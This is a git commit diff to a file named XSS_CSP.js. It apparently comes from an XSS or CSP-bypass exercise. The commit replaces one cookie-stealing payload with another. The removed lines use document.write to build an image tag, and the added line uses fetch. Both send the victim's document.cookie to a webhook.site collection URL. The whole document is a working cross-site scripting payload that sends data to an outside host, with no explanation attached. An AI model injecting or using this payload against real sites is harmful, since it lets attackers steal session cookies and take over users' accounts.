c21b945f86958f2f135fe22dd2d9066a4a195ae8
Akhz5 <ogakhz@gmail.com>
2024-07-29 14:18:48 +0100

    Update XSS_CSP.js

--- XSS_CSP.js
+++ XSS_CSP.js
@@ -1,3 +1,1 @@
-<script>
-document.write('<img src="https://webhook.site/15c60a75-956e-4320-a733-b17980afb4f7?c='+document.cookie+'" />');
-</script>
+fetch('https://webhook.site/15c60a75-956e-4320-a733-b17980afb4f7?c=' + document.cookie);
